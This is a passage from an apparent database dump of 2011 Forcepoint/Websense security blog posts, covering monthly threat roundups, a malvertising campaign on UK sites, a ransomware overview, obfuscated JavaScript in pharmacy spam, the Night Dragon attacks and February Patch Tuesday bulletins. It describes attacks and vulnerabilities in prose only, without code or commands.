text message or voice call whenever a user enters his or her password. This feature will be available to all of Google\'s free online services. \nData war between Facebook and Google is the headline towards the end of February. Updates of Google\'s Nexus S Android phone will no longer appear as if Facebook contacts are integrated with its Android Contacts app. Until Facebook introduces an API similar to Gmail, this standoff has yet to be concluded. \n \nBrowser and friends\nAdobe delivered a group of patches in the early part of February. Although not the top threat source, PDF exploit is still a favorite of cyber criminals. In the security update for Adobe Reader and Acrobat, 29 vulnerabilities have been fixed, 23 of which could cause the application to crash and potentially allow an attacker to take control of the affected system. Meanwhile, 13 vulnerabilities have been patched for Adobe Flash Player and 21 vulnerabilities have been patched for Adobe Shockwave Player.\nAs the most targeted application by exploit, Java has a security update this month. Oracle patched 21 Java security holes; 19 of these vulnerabilities may be remotely exploitable.\nGoogle has updated Chrome to 9.0.597.107 with 19 vulnerabilities fixed.\nAlso drawing attention is that Pwn2Own 2011 will be held in March in Vancouver. The conference will reward the hacker who successfully hacks IE, Safari, Firefox, or Chrome on a 64-bit system running the latest version of either OS X or Windows 7. Chrome was the only one that survivedast year; who will be the survivor this year?\n \nMicrosoft\nOn Patch Tuesday In February, Microsoft released twelve secruity bulletins. Three of them have a maximum severity rating of Critical. The first one MS11-003 resolves four vulnerabilities in Internet Explorer that could allow remote code execution when a user visits the specially crafted Web page. The second one MS11-006 is a patch for a newly released vulnerability (CVE-2010-3970) last month in Windows Shell Graphics Processing.  The last critical update MS11-007 resolved a privately reported vulnerability in the Windows OpenType Compact Font Format (CFF) driver. The other nine bulletins are rated “important”. The whole patch can be applied to the Microsoft Windows operating system, the Internet Explorer browser, the Microsoft Office productivity suite, Visual Studio, and IIS. However, the recently disclosed cross-site scripting vulnerability in MHTML was still not fixed in February. \nIn addition to the twelve security updates, Microsoft also released an important but non-security advisory (967940) related to Windows Autorun. The update provided a live package to restrict AutoPlay functionality to only CD and DVD media, in order to help protect customers from attacks involving the execution of arbitrary code by Autorun when a USB flash drive is inserted, with network shares, and with other non-CD media containing a file system with an Autorun.inf file.\nIn the middle of February a new vulnerability was discovered exploiting an SMB component of Windows. MS SRD quickly posted a blog on this vulnerablity stating that remote exploited code execution is unavailable.\nAt the end of February, Microsoft published a security advisory (24918888) to remind customers to be aware of an update to the Microsoft Malware Protection Engine. This is a privately reported vulnerability that could allow elevation of privileges if the Microsoft Malware Protection Engine scans a system just after an attacker who has valid login credentials and is using a specially crafted registry key. However, the vulnerability could not be exploited by anonymous users.\n \nHello ThreatSeeker. You\'ve got mail!\nA recap of the past month kicks off with a noticeable increase in spam, as well as spammers going green, having recycled templates or made modifications to slightly older campaigns, in order to present these with a more current theme or touch, offering a convincing effect to all who read them.\nThis was followed with the repeat offender the Magic blue pill with its mystical attributes, just in time for the Valentines Day rush. This again was aligned almost perfectly with the season to stock up for couples planning romantic getaways.

The email message titled \"The refreshed site of our company\", was not seen in high volumes but was quite an interesting find all the same, because there were common characteristics with malicious style compromises crossing over into the spam domain. This then begs the question: could there be a direct correlation between the two? \n\n\n\n \n\n\n \n\n\n \n\n\n \n\n\n \nSecurity Trends\nTippingpoint released 22 not patched vulnerabilities from different vendors. Tippingpoint is the operator of the \"Zero Day Initiative\" bug bounty program. They announced that they would release details 180 days after they become aware of a bug, even if the vendor has not yet released a patch. \nSpam image pages have been swapped for scam alerts on imageshack.us. Imageshack said they were able to find over 300 scam images uploaded to their services and were able to replace them with an alert image within an hour of their being reported. \nSuspicious companies were started to pay writers money to embed spyware into mobile applications. Mobile users typically have less control of their devices than PC users; therefore more care should be taken when you install applications onto mobile devices. \nVisa has relaxed its regulatory rules so that European high street merchants who capture at least three-quarters of their take through EMV-enabled chip-and-PIN terminals will no longer have to pass Payment Card Industry Data Security Standard (PCI DSS) audits every year.\n \nThis month\'s roundup contributors:\n  Artem Gololobov\n  Ping Yan\n  Grace Timcang\n  Ulysses Wang\n  Xue Yang\n  Amon Sanniez\n  Lei Li', 'https://www.forcepoint.com/blog/security-labs/month-threat-webscape-february-2011\n');

Taking advantage of the fact that a lot of security companies are more relaxed over the weekend, cyber criminals use the opportunity to strike. This weekend, the popular auto trading site Autotrader.co.uk and the cinema site Myvue.com both served ads that redirected the browsing user to malicious Web sites laden with exploits - a phenomenon also known as Malvertising. The Web sites themselves weren\'t compromised but were serving ads from an ad provider called Unanimis that led browsing users seamlessly - in the background and without their knowledge - to exploit sites.  \nUnanimis serves ads to thousands of Websites and we\'ve received reports that ebay.co.uk and londonstockexchange.com were also affected by this Malvertising campaign. One of the advantages that cyber criminals enjoy with Malvertising campaigns is that they can be easily spread across a large number of legitimate Websites without directly compromising those Websites, but indirectly through the use of a malicious ad.  \nWebsense customers are protected from such attacks with our Advanced Classification Engine analytics, our suite of technologies within TRITON.\n\n \nAttack Details\n\nThe malicious ads were not served from the sites\' main pages - in order for the exploit to work, specific ads would have to be loaded by the sites. For example at Autotrader.co.uk, a redirect to an exploit site through an ad would occur if the browsing user clicked on the button to search for a car, and at Myvue.com the same would happen if the browsing user clicked on the button to order movie tickets. It\'s at those points that more specific adverts are sent to the user\'s browser.  \nLet\'s take a look at an example from Autotrader.co.uk. Here is an image that captures what happens in the background when a user searches for a car with any desired criteria:\n\n \nThe first step is the URL that the user is browsing to when searching for a car according to his/her desired criteria: you can see that as part of the URL it has the postcode (blurred), the price range etc. In the background Autotrader.co.uk loads some advertisements from some ad providers. At step 2 it loads the advertisement from a legitimate ad provider called Unanimis. The advertiser redirects to the advertisement in step 3. Step 3 redirects further to step 4, but no advertisement is shown. Step 4 is a site loaded with an exploit kit and several exploits are sent to the user\'s browser. \nA car search with Autotrader.co.uk:\n\n \nThe Exploit \nThe Exploit site is heavily obfuscated and serves several exploits that target Internet Explorer, Adobe Acrobat Reader, and Java. We observed that the exploit kit used is very similar to an exploit kit called \"Blackhole\". Here are some of the detection rates of the PDF file exploit and the Java based exploit (JAR file). The dropped file installs a rogue antivirus on the user\'s computer - the software tells users that their computer is infected and offers a \"cleaning antivirus\" for $59.95. In the meantime the software disrupts the use and ordinary functionality of the computer by hogging CPU power, displaying disturbing pop-ups and more. The dropped file has low detection rate. \nWe have been following the exploit domains in this malvertising campaign for quite a long time now, and it seems that cyber criminals use fee-based advertising networks to propagate malware - that means cyber criminals are willing to pay in order to propagate malware. This goes hand in hand with Websense\'s threat Webscape predictions last year. \nA snapshot of the exploit URL in Websense\'s ThreatSeeker Network (The \"L\" signifies it was captured with Real Time scanning):\n\n \nThe exploit site - heavily obfuscated code:\n\n \nThe rogue antivirus that is installed:', 'https://www.forcepoint.com/blog/security-labs/myvuecom-autotradercouk-and-other-high-profile-websites-infected-malvertising\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (666, 'The Ransomway', 'Forcepoint John BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'There are always different ways to make money. Cybercriminals know it, and their imagination is unlimited as far as we can tell. Sometimes they lure users into downloading a rogue AV as a treatment for an “infected computer”, other times they literally extort users to pay to get their own data or computer access back. Let\'s have a look into the infamous malware called ransomware.\n\n\n	In general we can divide this sort of malware into three separate categories:\n\n\n		\n			file encrypters\n	\n	\n		\n			system lockers\n	\n	\n		\n			application lockers\n	\n\n	Even though their application varies, the aim is always the same. The victim has to pay, otherwise the data/access will be lost for ever.\n\n\n	File encrypters\n\n\n	The first group represents the most notorious extortion tactic from the real world – “pay now otherwise you will not see it again”. It all started around 1989, when the first ransomware was introduced – PC Cyberg Trojan alias AIDS trojan horse. The basics have remained unchanged since. Once the trojan launches on a victim\'s computer, all custom data (files that are important from the user perspective) is encrypted and is therefore inaccessible to the user. With PC Cyberg the victim was asked to post the ransom to a PO Box in Panama; nowadays the criminals ask users to send either an SMS to a premium mobile number, or transfer money to online payment services such as Egold, Liberty Services or others. The payment varies from $20 up to $200 depending on the sophistication of the malware and greediness of the authors.\n\n\n	In 2004 Gpcode (known also as PGPCoder - Trojan-Ransom.Win32.GpCode) emerged into the world. Unlike PC Cyberg, which used a weak symmetric key for the whole encryption, Gpcode starts with RC4 and carries on up to AES-256concealed into RSA-1024 public encryption - the symmetric encryption key is in the body of the virus encrypted by the RSA public key. This sophisticated method makes the cipher unbreakable and the victim has to either pay the ransom and hope for “honesty” from the attacker, or restore all data from the backup – if it exists. Once Gpcode finishes the encryption, the desktop changes and shows a notification of what has just happened with a message window explaining the same (Picture 1).\n\n\n	 \n\n\n	Picture 1 : Gpcode notification about encrypted files and the ransom request\n\n\n	 \n\n\n	\n\n\n	Every folder with encrypted data contains a new file explaining the situation – either !_READ_ME_!.txt or HOW TO DECRYPT FILES.txt, and every encrypted file has a new extension added – either ._CRYPT or .ENCODED (Picture 2).\n\n\n	Picture 2 : Every folder contains the extortion text explanation\n\n\n	\n\n\n	Files are not deleted so the recovery is theoretically possible unless the criminals are completely unscrupulous. You want to believe so, don\'t you?\n\n\n	The virus uses Microsoft Enhanced Cryptographic Provider to encrypt files built by default in Windows, which makes the whole operation extremely fast.\n\n\n	Since the first version of Gpcode has been discovered we have seen many different versions and also copycatting with weak or embedded keys. Nevertheless, this kind of malware can cause real harm to the victims unless all data has been freshly backed up.\n\n\n	System lockers\n\n\n	The second category contains malware that blocks access to the vital or essential parts of the system. From samples we have seen we could divide them into two types:\n\n\n		\n			screen lockers\n	\n	\n		\n			boot lockers\n	\n\n	The former is performed by either blocking the access to the system interaction completely and showing an extortion message (Picture 3), or just partially covering the screen with an embarrassing image and message (Picture 4) – e.g.Trojan.Ransomlock or Trojan.SMSlock. As the message can “reveal” unwanted details about the victim (“you surfed porn sites for free now you have to pay”) the victims often pay without contacting any professionals to help them out.\n\n\n	Picture 3 : The access to the machine is blocked by the malware\'s notification screen\n\n\n	\n\n\n	Picture 4 :  Embarrassing ad ransomware tactic.\n\n\n	\n\n\n	Both of these were first seen around April 2009, and mostly in Russia where there is no problem getting hold of anonymous premium numbers - as opposed to other Western countries who ask for strong proof of identity. As with the previous category there is no assurance that the victim will receive the unlocking key once the text is sent. As happens with ransoms in general, the criminals can ask for more once they see the victim is willing to pay. Fortunately, this malware is not as sophisticated as the previously-mentioned one, so there is a chance to get hold of an unlocking utility or a code generator from the Internet.\n\n\n	The second type, boot lockers, replaces the MBR on the disk with an infected one blocking the booting sequence of the computer completely – e.g. Trojan.Bootlock. The message informs the victim about a way how to decrypt the disk by sending a text to a premium number (Picture 5). The criminals claim the whole disk has been encrypted and the only way to get the data back is to pay via uKash or paysafecard on www.safe-data.ru (Picture 6). Again, fortunately for the victims, there is no encryption on the hard drives, only a simple MBR replacement. Also, this particular malware has been using the same passwords continuously - aaaaaaciip and aaaaadabia.\n\n\n	Picture 5 : Ransomware replaces the MBR with an infected one blocking the PC boot sequence completely\n\n\n	\n\n\n	Picture 6 : The criminals ask for a payment via online payment services\n\n\n	\n\n\n	Application lockers\n\n\n	The last category is probably the least widespread and least dangerous one. The malware blocks access to specific applications or Web sites asking either for ransom, or more often for the victim to fill out a survey subscribing them to the premium rate mobile services – e.g. Yimfoca IM worm. If the victim declines to fill in the survey, access to the page remains blocked. Even restarting the machine does not help. However, other browsers can access the site with no problems.\n\n\n	Malware delivery\n\n\n	The delivery of malicious files is done via the usual malware channels – fake codecs or video players, embedded in illegal copies of programs, via spam, IM chats, comments on personal pages, or USB drives containing \"special bonuses”. There is nothing new about the ways in which criminals try to compromise victims. Having said this, protection against such attacks is possible and Websense customers are protected with our Advanced Classification Engine analytics, our suite of technologies within TRITON.\n\n\n	Is ransomware a successor of scareware?\n\n\n	We dare to say it is not. Both malware groups try to convince the victim that there is no way to avoid paying money, although the approach is very different. With scareware the victims at least have a chance to resist the social engineering offering the only solution and work on the cleaning process on their own. With ransomware this chance hardly exists at all. Yes, there are many similarities and it is likely the same people stand behind both types of malware groups. However, in one case there is a \"seller\" offering the \"products and services\"; in the other one an extorter asking for ransom. Even though both are illegal and dishonest, the approach is different.\n\n\n	Restoration and Protection\n\n\n	Restoration of data or access depend on the kind of malware. In some cases it is possible to download a utility and clean the infected system, in other cases to replace malicious parts with clean ones. Unfortunately, there is no means to bypass malware such as Gpcode. Therefore the only protection is to keep up-to-date backups stored off the machine all the time. With cheap memory accessibility this should not be an issue at all. And, of course, services from Websense protect potential victims even against such obstacles as restoring data from backups.\n\n\n	To see how Websense protects our customers from Ransomware you can watch the following YouTube video:', 'https://www.forcepoint.com/blog/security-labs/ransomway\n');

In fact we see a LOT of Web sites that are injected with code used for black SEO purposes. This kind of code targets the visiting search engine instead of directly targeting the visiting user with exploits. This is a phenomenon also known as Spamdexing.\n\nWhen search engines visit a Web site, they also look at the links that the Web site currently links to. Having a reputable Web site (for example CNN.com) link to your site (if you have one) will add to the reputation of your site from the search engine\'s perspective. The opposite is also true: if a reputable Web site links to a dodgy and not reputable Web site, that won\'t be good for the reputable Web site and will affect its reputation from the visiting search engine\'s perspective. \nAs part of spammers\' and scammers\' efforts to get good reputation to their cunning Web sites and their customers\' sites, take for example Opole.pl: this official and pretty popular local Polish government Web site has had one of its sites injected with rogue links to pharmaceutical Web sites.  \nThe links are hidden from the user\'s browser (see the screenshot below), and since they have been injected to the Web site, it would probably be as easy to change them or add additional rogue links, like Iframes or scripts that can potentially lead to malicious content. \nYou might wonder: how common are hijacks like these?

However, what\'s nice is that not only do we get to analyze and protect against the larger campaigns, we can also notice smaller campaigns or oddball variants. \nA few days ago, we came across this interesting piece of email. Although small, it\'s interesting to see the crossover of malicious style compromises into the spam world. It also highlights the business model the spammers are going by... or perhaps it points to something more dangerous (more on that later). \nWebsense customers are protected with our Advanced Classification Engine analytics, our suite of technologies withinTRITON. \nThe process starts with an email that has a subject line like \"The refreshed site of our company\". The email message thanks the recipient for assisting them (the company) in solving a problem they had on their Web site, and urging the user to open it. Here are a couple of examples:\n \nFigure 1:\n\n \nFigure 2:\n\n \nSo, the spammers are using social engineering techniques to lure the user into clicking on the provided link. For an informed user, this type of text should raise a red flag - it is too generic to be legitimate, and doesn\'t really contain enough information about \"the company\". When I saw this email I immediately thought \"malicious\", since this type of social engineering is prevalent in malicious mails. Notice the \"testimonials\" about the \"service\" - what type of service?\n \nHowever, the text is generic enough by itself to bypass content rules (unless specifically applied against this campaign). The links provided are pages on compromised legitimate Web sites, so the spammers are once again trying to bypass reputation-based filtering. All of this is very common these days.\n \nClicking on the provided links leads us to the compromised Web sites, where we see very little content on the specific pages:\n \nFigure 3:\n\n \nBut what we do see is quite suspicious - obfuscated JavaScript. This further supports the notion that something malicious is going on. We could use one of the few handy tools we have here at Websense Security Labs™ to deobfuscate the HTML source, but instead, let\'s pause for a minute and try to do it manually.\nWe see the script starts by defining the variable ihe46 as a series of 2-3 digit numbers. If we scan the code further down we see a \"for\" loop that mentions +String.fromCharCode(kw1277). So we can understand that this loop will use the character code to create a string. The loop runs the length of the ihe46 variable, and uses its values to create the string... but wait, not the straight values, as we can see from this bit: {kw1277=ihe46[kmbi209]-65. In this case we need to deduct 65 from each number in the series to get to the real character codes we should be using. For example, the first number is 165, so we deduct 65, and see what the result (100) converts to - the letter \"d\" in the decimal code table. If we continue down the series we can arrive at the final string which reads:\n \nFigure 4:\n \nFollowing the link, I expected it to lead to a malicious Web site. Instead, a familiar face appeared:\n \nFigure 5:\n\n \nYes, it\'s our friend the smirking Canadian pharmacist...\n \nThe other example, also obfuscated in the same way but with a different offset, leads to a similar result:\n \nFigure 6:\n\n \nThis is not the first time we have seen a connection between malicious techniques and spam, such as back in September 2010 and June 2010, and it\'s no surprise since the infrastructure used to spread malicious and spam content is shared (botnets). What we are also reminded of here is how the business model of the spammers affects the way the spam is delivered. In this case, there\'s quite a departure from \"normal\" pharmaceutical spam. The initial email message has no related terms whatsoever. The spammers need the link to be clicked on to make their money... so they will use whatever technique they can to get the user to do that.  We can assume that the spammer\'s \"clients\" (owners of the various pharmaceutical sites) would prefer actual orders being placed on the final target site, so it\'s not clear how popular this technique will be for \"straight spam\". We do remember that any compromised site can be turned malicious, and we have seen, for example, how Zeus in the past redirected the victim to pharmaceutical sites after the victim\'s machine was exploited.\n \nSo, this campaign could either be a spam experiment... or maybe a staging/dry run for a malicious campaign. We\'ll have to wait and see.\n \nIn the meantime, we suggest resisting the temptation to see how you helped an unknown company improve their Web site...', 'https://www.forcepoint.com/blog/security-labs/refreshing-change-our-org-site-its-now-serving-spam\n');

Night Dragon targets the U.S. oil, gas, and petrochemical companies. It steals proprietary and confidential information from executives by using a combination of social engineering, Remote Access Trojans (RATs), and SQL injection attacks to gain access to external and internal hosts inside companies.\n\nThis attack is not unlike others we have seen in recent weeks. To accomplish these targeted attacks, it typically includes a combination of social engineering and publicly available RAT applications. In the case of Night Dragon, it uses a RAT called zwShell. Other common trojans used in these types of attacks include Gh0st RAT and Poison Ivy, all of which are readily available for download. Unlike the Aurora trojan, where large companies were attacked late 2009, the Night Dragon trojan doesn’t use 0-day exploits to gain access to hosts.\n\n \nTraditional security not capable of preventing\n  Attacks of this nature, where the attackers have specific objectives in mind, are very difficult to prevent. Much of the focus is concentrated on preventing the attack from occurring in the first place. Whilst this is the best thing to do, it’s very difficult to achieve. There is no single silver bullet for security, but Websense provides Data Loss Prevention (DLP) products - a proven data protection solution that is capable of securing data by preventing and blocking data leaks, even if the connection is encrypted. If the data is not allowed to leave the organization, regardless of the method (HTTP, HTTPS, email, USB devices, smartphones etc.), then the trojan is blocked and the attack fails. Protecting the assets that the attackers seek is an effective way to thwart these attempted attacks.  The DLP component is just one of several technologies in TRITON that we at Websense can provide to mitigate and protect against these types of attacks.', 'https://www.forcepoint.com/blog/security-labs/night-dragon\n');

To get the local files from the hard drive to an external server, he needed to use a non-blacklisted protocol handler. His PoC shows how how the MHTML protocol handler can break the strongly defined restrictions that Adobe Flash has. As the method looked so cute, somebody got inspired and successfully tried the same protocol against Microsoft too.\nWe had at least two more victims of malicious hacking this month. Lush left their customers vulnerable to credit card fraud for several months, and Trapster leaked more than 10 million registered users\' details. Sometimes being warned about speed cameras is not actually that valuable.\nOn 27th January 2011 the world blacked out. At least for Egypt. All communication channels were suspended by the national government in an apparently desperate effort to block political protests. More than 80 million people stopped communicating. You should probably book holidays in a different location this year.\nOpen source software development and distribution portal SourceForge was hit by a major attack. This action exploited several of their servers and many others have been shut down proactively. It looks like \"you-know-who\" does not like open source at all. Who is \"you-know-who\" though?\nUnlike the Egyptian government, Tunisia apparently decided to keep their communications on but intercept all user names and passwords for the major Web 2.0 portals, including Gmail, Facebook, and Yahoo. An injected code was found on all of the mentioned Web sites \"siphoning off login credentials\". One government rules them all. By the way, Tunisia is not the greatest destination for this year either.\nAmazon was apparently gimmicking Gawker. A failing security implementation caused issues with older Amazon.com accounts\' passwords, making them case-insensitive or allowing added-on extra characters. So a password \"protected\" was the same as \"PROTECTED\" or even better, as \"ProtecTED1234\" and so forth. This applied to older accounts only, so simply by changing your password to a new one (or even the same one) make things much more secure. Have you been with Amazon for a long time now? Go and change your password \"just for fun\".\n \nWeb 2 dot uh oh\nA slew of malicious attacks streamed Facebook this month. A worm, disguised as a photo viewer application, tricked users into installing the said malware when the \"View Photo\" button was clicked. Koobface is making its rounds once more and employing a couple of new tactics at hand as a new campaign spread using compromised accounts to send out direct messages. French President Nicolas Sarkozy and Facebook CEO Mark Zuckerberg\'s fan pages were apparently hacked and were used to distribute unusual political messages.  \nFacebook celebrated Data Privacy Day by offering its users the option to enable HTTPS connections. They also introduced Social Authentication, a concept very similar to Image CAPTCHA, but instead of using dictionary images, this feature uses actual pictures of a user\'s Facebook friend and asks him or her to name that person. \nMalware authors abused Google\'s redirection service, goo.gl, in their Twitter worm campaign which ultimately redirects users to fake AV sites.\n \nBrowser and friends\nGoogle Chrome has fixed multiple vulnerabilities in stable channel versions prior to 8.0.552.237. These vulnerabilities include a stack corruption vulnerability in the PDF renderer component, two memory corruption vulnerabilities in the Vorbis decoder, and a video frame size error resulting in a bad memory access.\nThe VirusTotal Web site released a plugin for Firefox named VTzilla. It allows users to scan downloads directly with VirusTotal\'s Web application before storing them. Moreover, it will not only scan files, but also URLs.\nApple fixed a man-in-the-middle attacker vulnerability in OS X 10.6. This vulnerability may be able to cause an unexpected application termination or arbitrary code execution if using a special formatted string in PackageKit\'s handling of distribution scripts.\n \nMicrosoft\nThe start of 2011 feels a bit far away by now but it was just the start of the year that unleashed a new zero day vulnerability in Microsoft’s Graphical Rendering Engine (CVE-2010-3970). The exploit takes advantage of the way thumbnails or previews are processed and presented to the user by Explorer.exe and can be triggered by crafting an exploit file and sending it to a target (the victim must view the file in a folder where thumbnails or previews are set). The security hole hasn\'t been patched yet and was added to the Metasploit framework. \nJanuary’s patch Tuesday brings an end to 3 major security holes in two released updates. One critical update fixes two issues in Microsoft Data Access Components (MDAC) where one of them could allow taking over a targeted system by visiting a specially crafted Web page (MS11-002). The second update fixes an issue in Microsoft Backup Manager where opening a legitimate remote Windows backup manager file can load a specially crafted malicious library – if located in the same directory (MS11-001). No attacks for any of the updates have been spotted in the wild. There are two holes in Windows that are yet to be patched, the mentioned vulnerability in Microsoft’s Graphical Rendering Engine and a vulnerability in Internet Explorer’s Cascading Style Sheets (CVE-2010-3971). We alerted on both vulnerabilitieshere and here. If you\'re wondering why Microsoft didn’t release a patch for those two holes in January’s patch Tuesday despite the fact that they have publicly available proof-of-concept code, how they prioritize patches is explained in their Research and Defense blog.\nThe end of January brings a vulnerability in Windows: this time it’s not remote code execution but a vulnerability in the MHTML protocol handler that could allow “information disclosure”. This effectively means that the MHTML protocol could be used to perform an XSS attack on the local machine when a user opens an HTML file with Internet Explorer (any version of it). More details on a workaround to prevent this attack and some examples in Microsoft Security Research and Defense blog\nSome good news for Microsoft as it released some updates to its secure development tools suite. One of the tools is called “Attack Surface Analyzer” which aims to give security professionals a clear picture of an installed application\'s changes to the system, allowing them to determine any security implications. It does that by “diffing” the state of the system before and after the application is installed. The tool is in Beta and available for 64bit version of Windows only. More details about the tool here. \n \nHello ThreatSeeker. You\'ve got mail!\nJust when we thought it was all over! In contrast to the previous month, spam might have taken a short vacation but it sure is not a permanent one.\nJanuarty saw the Return Of The Spam as we managed to draw a conclusion that as long as there is a profit to be made with spamming, spammers will always be around. The blip and consequently the drop in spam was short-lived although we can just about conclude spammers like the holidays just as the rest of us do.\nJanuary also saw the awakening of Waledac as this seemed to have gone offline for a few days until apparently a new set of instructions was received from the CNC to wake up. Monitoring the behavior after the bot awoke showed this was geared to send out spam marketing the magic blue pill. \n  Towards the end of the month, we noticed within our ThreatSeeker network that spammers are quite up to date, having capitalized on the deadline for self assessment tax within the UK and similarly for filing tax returns in the USA.\n  \n  \n  \n  \n  \n\nSecurity Trends\n\n  An Android Froyo (2.2) vulnerability reported by Thomas Cannon last year should have been fixed by now. However, Xuxian Jiang proved that it is still present even with the newest Android Gingerbread (2.3). The data stealing exposure is not that great but still worrying enough to keep the browser far away from unknown sites. \n  The BlackBerry Attachment Service got hit with a critical PDF flow vulnerability. When a specially crafted PDF file is executed on a smartphone which has an association to the mentioned server, it can cause an unexpected process termination and arbitrary code execution. PDF complexity is haunting more than the Windows and MacOS platforms. \n  Allegedly several major Web sites (gov,mil,edu) have been hacked and put up for sale by a hacker claiming to be from the Anonymous group. Most likely SQL injections put more than a dozen of such Web sites into a vulnerable position freely offering credentials and personal data to interested parties. Did you want to easily get accepted to a university? \n  A short time after Mozilla announced support for the \"Do-Not-Track\" mechanism allowing the users to choose what data they want to be collected about their browsing habits and preferences. Google also released a Chrome extension letting users opt out for tracking cookies from different ad networks. The end of targeted ads on the Internet? We wish so.\n  When all legitimate services evolve, the same has to be done by fraudsters to remain \"in the game\". After targeting most major online banks, ZeuS creators started to adjust their \"state-of-art\" for online payment providers too. Money Bookers, Nochex, Netspend and also E-gold became further victims of this infamous malware. Are we going to use cash once again? \n  German security researcher Thomas Roth claims to have  hacked into WPA-PSK protected Wi-fi networks using Amazon EC2 cloud services and a specialized program written by him. The worries over the cloud possibilities are becoming true. \n  Java trojans targeting Windows, Mac, and Linux computers at the same time are becoming a new trend among cybercriminals. Jnanabot is one of the latest.

This time Microsoft patched many important vulnerabilities, but have they fixed all currently known zero days? Let\'s find out. \nThis time, on February 8th, Microsoft released 12 security bulletins fixing various vulnerabilities, including three critical ones. Possibly the most important is the 0-day found recently in the Graphics Rendering Engine (GRE) and another 0-day that affects the Cascading Style Sheet (CSS) handler in Internet Explorer. The software giant also fixed a critical vulnerability in their OpenType Compact Font Format (CFF) driver.  \nA further 9 important bulletins were also included in this update, therefore it is highly recommended that users update all servers and workstations to avoid becoming a victim of an online crime.\n\n \nSome of the vulnerabilities included in this Tuesday Patch can be remotely exploited, while others need local access to the computer by the attacker. As the cyber criminal does not need to physically meet the victim for a remote exploit, a user is more vulnerable to this type of attack. Websense ThreatSeeker Network detects thousands of compromised Web sites every day, leading to one of these malicious sites which then exploits unpatched vulnerabilities and gains full access to the unaware user\'s computer.  Websense Security Gateway and Websense Hosted Services are protecting customers against this type of attack; however, it is very good practice to keep servers and workstations up to date.\n \nThe bulletins and vulnerabilities in detail:   \nThree critical vulnerabilities have been patched:\nMS11-003: Cumulative update which fixes four vulnerabilities in Internet Explorer. These vulnerabilities could allow an attacker to run any code on a computer without the user\'s consent while browsing a malicious or compromised Web site. The four vulnerabilities include:\n    CVE-2010-3971 - CSS Memory Corruption Vulnerability (0-day)\n      CVE-2011-0035 - Uninitialized Memory Corruption Vulnerability\n      CVE-2011-0036 - Uninitialized Memory Corruption Vulnerability\n      CVE-2011-0038 - Internet Explorer Insecure Library Loading Vulnerability\n    \nMS11-006: Fixes a full disclosed critical vulnerability in Graphics Rendering Engine (GRE) in many Windows versions, including Windows XP, Server, and Vista. The vulnerability could allow an attacker to execute arbitrary code on a computer while the user is viewing a specifically-crafted thumbnail image. See this blog for further details. The following vulnerability has been patched:\n    CVE-2010-3970 - Windows Shell Graphics Processing Overrun Vulnerability (0-day)\n    \nMS11-007: Security update for a non-disclosed vulnerability in the Compact Font Format (CFF), which affects Windows versions, including Windows XP, Server, and Windows 7. The vulnerability could allow an attacker to execute arbitrary code on a computer while the user is viewing content which includes a specifically-crafted OpenType font. The following vulnerability has been patched:\n    CVE-2011-0033 - OpenType Font Encoded Character Vulnerability\n    \n \nNine non-critical, but important security patches:\nMS11-004: This bulletin patches a vulnerability in Microsoft Internet Information Services (IIS) FTP Service, which could allow an attacker to execute a code on the FTP server using a malicious FTP command. Since FTP Service is not installed by default on IIS, this update was categorized as \"Important\" only. The following vulnerability has been patched:\n    CVE-2010-3972 - IIS FTP Service Heap Buffer Overrun Vulnerability (0-day)\n    \nMS11-005: This is a security update for the vulnerability found in Active Directory. The vulnerability could allow a cyber criminal to attack an Active Directory server causing Denial of Service, however, the attacker needs to join their domain first and must have administrator privileges on that domain. Because of this, this vulnerability is not critical.\n    CVE-2011-0040 - Active Directory SPN Validation Vulnerability\n    \nMS11-008: This bulletin resolves two non-disclosed vulnerabilities in Microsoft Visio. The vulnerability could allow an attacker to execute arbitrary code on the computer while the user is viewing a specifically crafted Visio file. The following vulnerabilities have been patched:\n    CVE-2011-0092 - Visio Object Memory Corruption Vulnerability\n      CVE-2011-0093 - Visio Data Type Memory Corruption Vulnerability\n    \nMS11-009: This one fixes a non-disclosed vulnerability in the JScript and VBScript Scripting Engines. The vulnerability could allow an attacker to gather information from the user\'s computer while the user is visiting a malicious Web site. A typical trick to get a user to visit one of these Web sites is sending a spam or phishing e-mail with the link. The following vulnerability has been patched:\n    CVE-2011-0031 - Scripting Engines Information Disclosure Vulnerability\n    \n MS11-010: Another non-disclosed vulnerability which affects the Microsoft Windows Client/Server Run-time Subsystem (CSRSS) in Windows XP and Windows Server 2003. This vulnerability could allow a criminal an Elevation of Privilege type of attack on a local computer by retrieving sensitive logon information from the user while they are logging on and off. Doing this, an attacker could gain privileges from other users including the administrator. The following vulnerability has been patched:\n  CVE-2011-0030 - CSRSS Elevation of Privilege Vulnerability\n MS11-011: This is a cumulative update correcting two different vulnerabilities. Both of them could allow a criminal an Elevation of Privilege type of attack on a local computer by running a specifically-crafted application. The following vulnerabilities have been patched:\n    CVE-2010-4398 - Driver Improper Interaction with Windows Kernel Vulnerability\n      CVE-2011-0045 - Windows Kernel Integer Truncation Vulnerability\n    \nMS11-012: This cumulative update fixes another Elevation of Privilege type of vulnerability, where the attacker could gain privileges from other users including the administrator. For this the attacker needs to be able to log on to the computer and run a specifically-crafted application. The following vulnerabilities have been patched:\n    CVE-2011-0086 - Win32k Improper User Input Validation Vulnerability\n      CVE-2011-0087 - Win32k Insufficient User Input Validation Vulnerability\n      CVE-2011-0088 - Win32k Window Class Pointer Confusion Vulnerability\n      CVE-2011-0089 - Win32k Window Class Improper Pointer Validation Vulnerability\n      CVE-2011-0090 - Win32k Memory Corruption Vulnerability\n    \nMS11-013: This bulletin patches Windows Kerberos.  The vulnerability could allow a cyber criminal to attack and forge service tickets in Kerberos server, gaining privileges from other users including the administrator. However, the attacker needs to join their domain first and must have administrator privileges on that domain. Because of this, this vulnerability is not critical. The following vulnerabilities have been patched:\n    CVE-2011-0043 - Kerberos Unkeyed Checksum Vulnerability\n      CVE-2011-0091 - Kerberos Spoofing Vulnerability\n    \nMS11-014: This non-disclosed vulnerability is a yet another Elevation of Privilege type, that affects the Local Security Authority Subsystem Service (LSASS) in Windows XP and Windows Server 2003. The vulnerability could allow an attack on a local computer by running a specifically-crafted application on it.

